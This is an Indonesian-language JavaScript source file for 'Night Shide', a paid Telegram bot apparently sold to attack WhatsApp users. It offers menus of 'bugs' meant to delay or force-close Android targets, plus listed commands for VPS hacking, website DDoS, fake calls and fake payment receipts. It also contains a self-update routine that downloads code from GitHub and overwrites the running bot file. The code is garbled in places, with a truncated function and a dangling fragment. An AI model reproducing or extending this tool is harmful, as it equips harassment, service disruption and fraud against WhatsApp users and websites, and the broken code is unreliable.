const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const { 
  PTERO_URL,
  PTERO_API_KEY,
  EGG_ID,
  NEST_ID,
  LOCATION_ID,
} = require('./config.js'); // Mengambil data dari config.js
const {
  makeWASocket,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
  generateForwardMessageContent, // Baru
  prepareWAMessageMedia,         // Baru
  proto,                         // Baru
  jidDecode,                     // Baru
  areJidsSameUser                // Baru
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS, TOKEN_BOT } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./premiums.json";
const adminFile = "./admins.json";

// Alamat file access.json
const ACCESS_FILE = path.join(__dirname, 'access.json');

// LOGIKA OTOMATIS: Buat file kalau belum ada pas script di-run
if (!fs.existsSync(ACCESS_FILE)) {
    fs.writeFileSync(ACCESS_FILE, JSON.stringify([], null, 2));
    console.log("✅ File access.json otomatis terbuat!");
}

// DEFINISI FUNGSI hasAccess
function hasAccess(id) {
    try {
        const data = fs.readFileSync(ACCESS_FILE, 'utf-8');
        const allowed = JSON.parse(data);

        // Pastikan 'allowed' adalah Array supaya .includes() tidak error
        if (Array.isArray(allowed)) {
            // Kita convert id ke String supaya pencocokan ID (angka/teks) selalu akurat
            return allowed.map(String).includes(String(id));
        }
        return false;
    } catch (e) {
        return false;
    }
}
// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://gangalink.vercel.app/i/uvjob78z.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
const databaseUrl =
  "https://raw.githubusercontent.com/stremarzz-rgb/SC-NIght-SHide/refs/heads/main/tokens.js"


async function fetchValidTokens() {
  try {
    const response = await axios.get(databaseUrl);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red.bold("Gagal Saat Mengambil Data Dari Url", error.message));
    return [];
  }
}

async function validateToken() {
 try {
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(TOKEN_BOT)) {
    console.log(chalk.bold.red(`
========================
Tokens Is Not Registered
========================
Please Contact @R1LZzXtr4v3X In Telegram For Registration Tokens`));
          process.exit(1);
    }
     startBot()
  } catch (error) {
   console.error("Error:", error);
      process.exit(1);
  }
}

function startBot() {
  console.clear();
  console.log(
    chalk.cyan(`
   ⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀
      `));
  console.log(
    chalk.bold.green(`⠀⠀⠀⠀
Author : @RilzxxNotDev
Best Friend : @youknowpump
Thanks For Purchasing This Script
© N I G H T S H I D E 
`));
}

validateToken();

// WhatsApp Connection

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder default
    }),
  };
};

8779936321; // GANTI ID KAMU
    if (ctx.from.id !== OWNER_ID) return;

    // Link Raw GitHub kamu
    const URL_GITHUB = 'https://raw.githubusercontent.com/stremarzz-rgb/SC-NIght-SHide/refs/heads/main/index.js';
    
    // NAMA FILE YANG ADA DI PANEL (WAJIB SAMA DENGAN FILE UTAMA BOT)
    const NAMA_FILE_BOT = 'index.js'; 
    const PATH_TUJUAN = path.join(__dirname, NAMA_FILE_BOT);

    try {
        await ctx.reply('🔄 Mendownload update permanen...');

        const response = await axios({
            method: 'get',
            url: URL_GITHUB,
            responseType: 'arraybuffer' 
        });

        fs.writeFileSync(PATH_TUJUAN, response.data);

        await ctx.reply('✅ Update Selesai! File telah diperbarui di Panel.');
        await ctx.reply('Bot akan restart otomatis untuk menjalankan kode terbaru...');

            setTimeout(() => {
            process.exit(0);
        }, 2000);

    } catch (error) {
        console.error(error);
        ctx.reply('❌ Gagal Update: ' + error.message);
    }
});
bot.on('new_chat_members', async (ctx) => {
    const isBot = ctx.message.new_chat_members.some(u => u.id === ctx.botInfo.id);
    
    if (isBot) {
        const welcomeMsg = `<blockquote><b>Night Shide</b></blockquote>`;
        
        await ctx.replyWithHTML(welcomeMsg);
    }
});
bot.start(async (ctx) => {       
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const isPrivate = ctx.chat.type === 'private';
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";  

        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Fungsi pembantu escape MarkdownV2
const ESC = (str) => str.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');

// 1. Pesan Awal (Vibe Cinematic Dark)
const loadMsg = await ctx.replyWithMarkdownV2(
    `> 🌌 *VERSION 1.0.0*
> 🛠️ *INITIALIZING CORE SYSTEM\\.\\.*
> _Waking up the nebula engine\\.\\._`,
    { disable_web_page_preview: true }
);

const steps = [
    "🛰️ ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ VERSION 1.0.0 ɴᴏᴅᴇ\\.\\.",
    "🌑 ꜱʏɴᴄʜʀᴏɴɪᴢɪɴɢ ᴅᴀʀᴋ ᴍᴀᴛᴛᴇʀ ᴀᴘɪ",
    "💠 ɪɴᴊᴇᴄᴛɪɴɢ ᴜɪ ɢʟᴀꜱꜱᴍᴏʀᴘʜɪꜱᴍ",
    "🛡️ ᴇɴᴄʀʏᴘᴛɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴠɪᴀ ᴠᴘꜱ",
    "✨ ɴᴇʙᴜʟᴀ ɪɴᴛᴇʀꜰᴀᴄᴇ ᴅᴇᴘʟᴏʏᴇᴅ"
];

// Progress bar gaya elegant
const progress = [
    "🌑──────────",
    "🌓──🌑──────",
    "🌔────🌑────",
    "🌕──────🌑──",
    "🌌──────────"
];

for (let i = 0; i < steps.length; i++) {
    await delay(800);
    
    const content = 
`> 🔮 *\\[ PROJECT NIGHT SHIDE RUN \\]*
> 
> ${steps[i]}
> 
> \`${progress[i]}\` *${(i + 1) * 20}%*
> \`System: ${(i === 4) ? "Stable" : "Optimizing"}\\.\\.\``;

    await ctx.telegram.editMessageText(
        ctx.chat.id, 
        loadMsg.message_id, 
        null, 
        content, 
        { parse_mode: "MarkdownV2" }
    ).catch((e) => console.log("Edit Error:", e.message));
}

await delay(600);
await ctx.telegram.editMessageText(
    ctx.chat.id, 
    loadMsg.message_id, 
    null, 
    `> 💠 *CORE ACTIVATED*
> _Halo Dunia_`, 
    { parse_mode: "MarkdownV2" }
).catch(() => {});

await delay(1200);
await ctx.deleteMessage(loadMsg.message_id).catch(() => {});
    
  const mainMenuMessage = `
<blockquote><strong>🌸 ⌜ WELCOME ⌟ 🌸</strong></blockquote>
<blockquote><strong>Hello, ${Name} 👋🏻 I Am An Assistant Bot To Help You In The World Of Bugs</strong></blockquote>
<b>────────────────────</b>
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
<b>↯ Developer : @RilzxxNotDev
↯ Version : Project V4
↯ Platform : Telegram</b>
<blockquote><strong>🌸 ⌜ INFORMATION ⌟ 🌸</strong></blockquote>
<b>↯ User Id: ${userId}
↯ User Name : ${Name}</b>
<blockquote><strong>🌸 ⌜ SENDER STATUS ⌟ 🌸</strong></blockquote>
<b>↯ Status Sender : ${waStatus}</b>
<blockquote><b>🌸 ⌜ ☰ NOTE: SLIDER NAVIGATION ⌟ 🌸</b></blockquote>
`;
  
  const mainKeyboard = [
    [
      {
        text: "<",
        callback_data: "bug_menu", style: "success",
      },
      {
        text: "𝗢𝘄𝗻𝗲𝗿",
        url: "https://t.me/RilzxxNotDev", style: "danger",
      },
      {
        text: ">",
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐌𝐞𝐧𝐮", 
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂",
        url: "https://t.me/ALLTESTIRILZXX", style: "primary",
      },
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂", 
        url: "https://t.me/aboutXikaa", style: "primary",
      }
    ]
];

  try { 
      await ctx.replyWithAudio({ url: 'https://d.top4top.io/m_3757q15hf1.mp3' }, {
            caption: "🎵 Lagu Enak Nih Woy",
            title: "Sency",
            performer: "No MakeUp Tetep Cantik"
        });
       await ctx.replyWithPhoto(getRandomImage(), {
            caption: mainMenuMessage,
            parse_mode: "HTML",
            message_effect_id: isPrivate ? "5104841245755180586" : undefined,
            reply_markup: { inline_keyboard: mainKeyboard },
        });
  } catch (e) {
    console.error(e);
  }
});
// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
        
      const mainMenuMessage = `
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
<b>↯ Developer : @RilzxxNotDev
↯ Version : V1.0.0
↯ Platform : Telegram</b>
<blockquote><strong>🌸 ⌜ INFORMATION ⌟ 🌸</strong></blockquote>
<b>↯ User Id: ${userId}
↯ User Name : ${Name}</b>
<b>────────────────────</b>
<blockquote><b>🌸 ⌜ CONTROL ⌟ 🌸</b></blockquote>
<b>—✧ /addadmin
✧ /deladmin
✧ /Status
✧ /addsender
✧ /delsesi
✧ /addprem 
✧ /delprem 
✧ /cekprem</b>
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
  inline_keyboard:[
    [
      {
        text: "<",
        callback_data: "bug_menu", style: "success",
      },
      {
        text: "𝗢𝘄𝗻𝗲𝗿",
        url: "https://t.me/RilzxxNotDev", style: "danger",
      },
      {
        text: ">",
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐌𝐞𝐧𝐮", 
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂",
        url: "https://t.me/ALLTESTIRILZXX", style: "primary",
      },
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂", 
        url: "https://t.me/aboutXikaa", style: "primary",
      }
    ],
  ]
};

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
bot.action("cpanel_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
      const mainMenuMessage = `
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
<b>↯ Developer : @RilzxxNotDev
↯ Version : V1.0.0
↯ Platform : Telegram</b>
<blockquote><strong>🌸 ⌜ INFORMATION ⌟ 🌸</strong></blockquote>
<b>↯ User Id: ${userId}
↯ User Name : ${Name}</b>
<b>────────────────────</b>
<blockquote><strong>🌸 ⌜ CPANEL ⌟ 🌸</strong></blockquote>
<b>—✧ /1gb → nama 
✧ /2gb → nama
✧ /3gb → nama 
✧ /4gb → nama 
✧ /5gb → nama
✧ /6gb → nama
✧ /7gb → nama 
✧ /unli → nama
✧ /cadmin → nama
<blockquote><strong>🌸 ⌜ 𝔸𝔻𝔻 ⌟ 🌸</strong></blockquote>
—✧ /addadmin
—✧ /deladmin
—✧ /addprem 
—✧ /delprem 
—✧ /addallakses ( Add All Member Gb )
—✧ /delakses ( Del Akses Gb )
—✧ /listallakses ( Daftar List Akses Gb )</b>
<blockquote><b>🌸 ⌜ 𝐕𝐈ONIX 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 ⌟ 🌸</b></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
  inline_keyboard:[
    [
      {
        text: "<",
        callback_data: "bug_menu", style: "success",
      },
      {
        text: "𝗢𝘄𝗻𝗲𝗿",
        url: "https://t.me/RilzxxNotDev", style: "danger",
      },
      {
        text: ">",
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐌𝐞𝐧𝐮", 
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂",
        url: "https://t.me/ALLTESTIRILZXX", style: "primary",
      },
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂", 
        url: "https://t.me/aboutXikaa", style: "primary",
      }
    ],
  ]
};

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
bot.action("tools_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
      const mainMenuMessage = `
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
<b>↯ Developer : @RilzxxNotDev
↯ Version : V1.0.0
↯ Platform : Telegram</b>
<blockquote><strong>🌸 ⌜ INFORMATION ⌟ 🌸</strong></blockquote>
<b>↯ User Id: ${userId}
↯ User Name : ${Name}</b>
<b>────────────────────</b>
<blockquote><strong>🌸 ⌜ TOOLS ⌟ 🌸</strong></blockquote>
<b>↯ /hackvps
↯ /ddosweb
↯ /rasukbot
↯ /fakecall
↯ /fakedana
↯ /fakedanav2
↯ /cekfuncv3
↯ /cekfuncv2
↯ /fixfunc
↯ /gaymeter
↯ /ghost
<blockquote><strong>🌸 ⌜ TEST FUNCTION BUGS NUMBER ⌟ 🌸</strong></blockquote>
↯ /testfunction ᝄ 628xx ( Replay Function / file.js And Jumlah Loop )
<blockquote><strong>🌸 ⌜ TEST FUNCTION BUGS GROUP ⌟ 🌸</strong></blockquote>
↯ /testgb ᝄ Link Gb ( Replay Function And Jumlah Loop )</b>
<blockquote><b>🌸 ⌜ 𝐕𝐈ONIX 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 ⌟ 🌸</b></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
  inline_keyboard:[
    [
      {
        text: "<",
        callback_data: "bug_menu", style: "success",
      },
      {
        text: "𝗢𝘄𝗻𝗲𝗿",
        url: "https://t.me/RilzxxNotDev", style: "danger",
      },
      {
        text: ">",
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐌𝐞𝐧𝐮", 
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂",
        url: "https://t.me/ALLTESTIRILZXX", style: "primary",
      },
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂", 
        url: "https://t.me/aboutXikaa", style: "primary",
      }
    ],
  ]
};

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler bug_custom
bot.action("tqto_custom", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();   
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
        
  const mainMenuMessage = `
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
<b>↯ Developer : @RilzxxNotDev
↯ Version : V1.0.0
↯ Platform : Telegram</b>
<blockquote><strong>🌸 ⌜ INFORMATION ⌟ 🌸</strong></blockquote>
<b>↯ User Id: ${userId}
↯ User Name : ${Name}</b>
<b>────────────────────</b>
<blockquote><b>🌸 ⌜ SUPPORT ⌟ 🌸</b></blockquote>
<b>↯ Allah - My God
↯ Nabi Muhammad - My Idola
↯ @RilzxxNotDev - Developer
↯ @youknowpump - My Best Friend
↯ All Buyer Script</b>
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
  inline_keyboard:[
    [
      {
        text: "<",
        callback_data: "bug_menu", style: "success",
      },
      {
        text: "𝗢𝘄𝗻𝗲𝗿",
        url: "https://t.me/RilzxxNotDev", style: "danger",
      },
      {
        text: ">",
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐌𝐞𝐧𝐮", 
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂",
        url: "https://t.me/ALLTESTIRILZXX", style: "primary",
      },
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂", 
        url: "https://t.me/aboutXikaa", style: "primary",
      }
    ],
  ]
};

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
  const mainMenuMessage = `
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
<b>↯ Developer : @RilzxxNotDev
↯ Version : V1.0.0
↯ Platform : Telegram</b>
<blockquote><strong>🌸 ⌜ INFORMATION ⌟ 🌸</strong></blockquote>
<b>↯ User Id: ${userId}
↯ User Name : ${Name}</b>
<b>────────────────────</b>
<blockquote><b> ⌜ ANDRO BUGS ⌟ </b></blockquote>
↯ <b> /AS
 [Delay Hard]
↯ /King
 [Delay Hard V2]
 <blockquote><b> ⌜ SPECIAL ANDRO BUGS ⌟ </b></blockquote>
 ↯ /Poker
 [Force Close New]
 <blockquote><b> ⌜  ALL MENU BUG BEBAS SPAM ⌟ </b></blockquote>
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
  inline_keyboard:[
    [
      {
        text: "<",
        callback_data: "bug_menu", style: "success",
      },
      {
        text: "𝗢𝘄𝗻𝗲𝗿",
        url: "https://t.me/RilzxxNotDev", style: "danger",
      },
      {
        text: ">",
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐌𝐞𝐧𝐮", 
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂",
        url: "https://t.me/ALLTESTIRILZXX", style: "primary",
      },
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂", 
        url: "https://t.me/aboutXikaa", style: "primary",
      }
    ],
  ]
}

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
  const mainMenuMessage = `
<blockquote><strong>🌸 ⌜ WELCOME ⌟ 🌸</strong></blockquote>
<blockquote><strong>Hello, ${Name} 👋🏻 I Am An Assistant Bot To Help You In The World Of Bugs</strong></blockquote>
<b>────────────────────</b>
<blockquote><b>🌸 ⌜ NIGHT SHIDE ⌟ 🌸</b></blockquote>
<b>↯ Developer : @RilzxxNotDev
↯ Version : Project V4
↯ Platform : Telegram</b>
<blockquote><strong>🌸 ⌜ INFORMATION ⌟ 🌸</strong></blockquote>
<b>↯ User Id: ${userId}
↯ User Name : ${Name}</b>
<blockquote><strong>🌸 ⌜ SENDER STATUS ⌟ 🌸</strong></blockquote>
<b>↯ Status Sender : ${waStatus}</b>
<blockquote><b>🌸 ⌜ ☰ NOTE: SLIDER NAVIGATION ⌟ 🌸</b></blockquote>
`;
    
    const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  
  const keyboard = {
  inline_keyboard:[
    [
      {
        text: "<",
        callback_data: "bug_menu", style: "success",
      },
      {
        text: "𝗢𝘄𝗻𝗲𝗿",
        url: "https://t.me/RilzxxNotDev", style: "danger",
      },
      {
        text: ">",
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐌𝐞𝐧𝐮", 
        callback_data: "owner_menu", style: "success",
      }
    ],
    [
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂",
        url: "https://t.me/ALLTESTIRILZXX", style: "primary",
      },
      {
        text: "📢 ⦂⦂ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ⦂⦂", 
        url: "https://t.me/aboutXikaa", style: "primary",
      }
    ],
  ]
}
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

// --- COMMAND CREATE PANEL --
bot.command('1gb', checkPremium, async (ctx) => {
    const isPrivate = ctx.chat.type === 'private';
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.replyWithHTML("<b>⚠️ Format:</b> <code>/1gb [nama]</code>");
    
    // Cek Akses (Owner atau Grup terdaftar)
    if (!hasAccess(ctx.from.id) && !hasAccess(ctx.chat.id)) {
        return ctx.replyWithHTML("<blockquote><b>❌ AKSES DITOLAK!</b>\nLo belum punya izin buat create panel. Hubungi @Raffioffci2</blockquote>");
    }

    const username = args[1].toLowerCase().replace(/[^a-z0-9]/g, '');
    const email = `${username}@NightShide.com`;
    const password = Math.random().toString(36).slice(-10);

    try {
        await ctx.replyWithHTML(`⏳ <b>PROSES:</b> Sedang membuatkan panel 1GB untuk <b>${username}</b>...`);

        // --- PROSES CREATE USER ---
        const userRes = await axios.post(`${PTERO_URL}/api/application/users`, {
            email: email, username: username, first_name: username, last_name: "Shide", password: password
        }, { headers: { 'Authorization': `Bearer ${PTERO_API_KEY}`, 'Accept': 'application/json' } });

        const userId = userRes.data.attributes.id;

        // --- PROSES CREATE SERVER ---
        await axios.post(`${PTERO_URL}/api/application/servers`, {
            name: `NightShide-${username}`,
            user: userId,
            nest: NEST_ID, egg: EGG_ID,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: { "CMD_RUN": "npm start", "MAIN_FILE": "start.js" },
            limits: { memory: 1024, swap: 0, disk: 1024, io: 500, cpu: 100 },
            feature_limits: { databases: 5, backups: 5, allocations: 1 },
            deploy: { locations: [LOCATION_ID], dedicated_ip: false, port_range: [] }
